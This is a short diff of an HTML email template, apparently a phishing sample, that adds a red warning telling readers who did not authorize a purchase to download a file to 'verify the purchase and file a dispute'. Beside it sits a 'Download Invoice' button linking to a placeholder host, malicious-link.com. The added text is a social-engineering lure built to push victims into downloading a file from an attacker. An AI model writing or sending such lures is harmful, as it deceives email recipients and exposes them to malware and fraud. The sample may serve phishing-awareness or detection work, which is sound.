@@ -120,6 +120,12 @@
                 </table>
             </div>
 
+            <!-- Important Note -->
+            <p style="color: red; font-weight: bold; margin-top: 20px;">
+                If you did not authorize this transaction, or if you would like to confirm this order,  
+                please download the file below to verify the purchase and file a dispute.
+            </p>
+
             <!-- Button -->
             <div class="button-container">
                 <a href="http://malicious-link.com/DownloadInvoice" class="button">Download Invoice</a>
